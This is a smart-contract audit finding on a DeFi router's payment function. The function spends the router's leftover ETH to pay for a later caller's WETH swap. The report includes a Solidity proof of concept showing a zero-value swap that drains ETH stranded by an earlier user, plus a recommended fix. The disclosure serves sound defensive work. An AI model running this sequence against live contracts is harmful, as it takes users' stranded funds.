Audit Report

## Title
Router's Accumulated ETH Drained via WETH Payment Path Without `msg.value` Validation — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
The `pay` function in `PeripheryPayments.sol` uses `address(this).balance` — the router's entire native ETH balance — to fund WETH swaps, completely ignoring the `payer` argument and never validating that the ETH originated from the current transaction's `msg.value`. Any ETH stranded in the router from a prior transaction (e.g., a user who overpaid `exactOutputSingle` and omitted `refundETH`) can be silently consumed by a subsequent attacker calling `exactInputSingle{value: 0}(tokenIn: WETH, amountIn: strandedAmount)`, who receives the full swap output at zero cost.

## Finding Description

**Root cause — `pay` ignores `payer` when native balance is sufficient:**

In `PeripheryPayments.pay` (lines 73–77), when `token == WETH` and `address(this).balance >= value`, the function wraps the router's native ETH and transfers WETH to the pool without ever calling `transferFrom` on the `payer`: [1](#0-0) 

The `payer` argument (set to `msg.sender` at swap entry via transient storage) is completely ignored in this branch. The router's entire ETH balance — including ETH left over from **previous transactions** — is eligible to fund the swap.

**ETH stranding precondition:**

The `receive()` function only blocks plain ETH transfers (from non-WETH senders): [2](#0-1) 

However, ETH sent via payable function calls (e.g., `exactOutputSingle{value: 1 ether}(...)`) bypasses `receive()` entirely and lands in the router's balance. When the actual `amountIn < msg.value`, the surplus is left stranded. The `refundETH` call is optional and not enforced: [3](#0-2) 

**Exploit call path:**

1. Victim calls `exactOutputSingle{value: 1 ether}` where oracle-determined `amountIn = 0.5 ETH`. The `pay` callback wraps 0.5 ETH; the remaining 0.5 ETH stays in the router. Victim omits `refundETH`. [4](#0-3) 

2. Attacker calls `exactInputSingle{value: 0}(tokenIn: WETH, amountIn: 0.5 ether)`. The router sets payer = attacker in transient storage: [5](#0-4) 

3. The pool fires `metricOmmSwapCallback` → `_justPayCallback` → `pay(WETH, attacker, pool, 0.5 ether)`: [6](#0-5) 

4. Inside `pay`, `nativeBalance (0.5 ETH) >= value (0.5 ETH)` → router wraps its own stranded ETH and sends WETH to the pool. The attacker receives the full swap output. The `payer` (attacker) is never charged. [1](#0-0) 

**Same path reachable via `MetricOmmPoolLiquidityAdder`**, which also inherits `PeripheryPayments` and calls `pay` in its liquidity callback: [7](#0-6) 

**No existing guard is sufficient:** The transient callback context correctly binds the pool caller and the payer identity, but the `pay` function itself discards the payer when native balance is available. There is no check that `address(this).balance` does not exceed `msg.value` for the current call.

## Impact Explanation

Direct loss of user principal. Any ETH stranded in the router is immediately claimable by any unprivileged attacker via a zero-value WETH swap. The attacker receives the full swap output while contributing nothing; the victim's overpaid ETH is permanently lost. This meets the Critical threshold: loss of 100% of the stranded principal, no privilege required, exploitable atomically.

## Likelihood Explanation

The `multicall + refundETH` pattern is explicitly tested but not enforced: [8](#0-7) 

Any user calling `exactOutputSingle` with ETH overpayment who omits `refundETH` leaves ETH stranded. MEV bots monitoring the router's balance can drain it atomically in the same or next block. The precondition is a routine consequence of the documented usage pattern and requires no special privilege.

## Recommendation

Cap the native ETH used in `pay` to `msg.value` rather than `address(this).balance`. The cleanest fix is to track ETH consumed from `msg.value` in transient storage at each top-level payable entry point and validate in `pay` that the native balance drawn does not exceed the current call's `msg.value`. Alternatively, assert at the start of each payable entry that `address(this).balance == msg.value` (i.e., the router must be empty before each call), reverting if stale ETH is detected.

## Proof of Concept

```solidity
// Step 1: Victim calls exactOutputSingle with 1 ETH but actual amountIn = 0.5 ETH.
// Victim forgets refundETH. Router now holds 0.5 ETH.
router.exactOutputSingle{value: 1 ether}(
    IMetricOmmSimpleRouter.ExactOutputSingleParams({
        pool: pool,
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountOut: someAmount,       // oracle prices such that amountIn = 0.5 ETH
        amountInMaximum: 1 ether,
        recipient: victim,
        deadline: block.timestamp + 1,
        priceLimitX64: 0,
        extensionData: ""
    })
);
// router.balance == 0.5 ETH (stranded)

// Step 2: Attacker calls with value: 0.
// pay() sees nativeBalance (0.5 ETH) >= value (0.5 ETH),
// wraps router's ETH, pays pool — no transferFrom on attacker.
router.exactInputSingle{value: 0}(
    IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: pool,
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: 0.5 ether,
        amountOutMinimum: 0,
        recipient: attacker,
        deadline: block.timestamp + 1,
        priceLimitX64: 0,
        extensionData: ""
    })
);
// Attacker receives token1 output; victim's 0.5 ETH is gone.
// router.balance == 0
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-78)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L130-147)
```text
  function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    int128 expectedAmountOut = MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountOut);
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(params.recipient, params.zeroForOne, -expectedAmountOut, priceLimitX64, "", params.extensionData);
    int128 amountOut = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    if (amountOut != expectedAmountOut) revert InvalidOutputAmount(amountOut, params.amountOut);

    amountIn = MetricOmmSwapInputs.int128ToUint128(
      MetricOmmSwapResults.extractAmountIn(params.zeroForOne, amount0Delta, amount1Delta)
    );

    if (amountIn > params.amountInMaximum) revert InputTooHigh(amountIn, params.amountInMaximum);
    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L22-22)
```text
contract MetricOmmPoolLiquidityAdder is IMetricOmmPoolLiquidityAdder, PeripheryPayments {
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
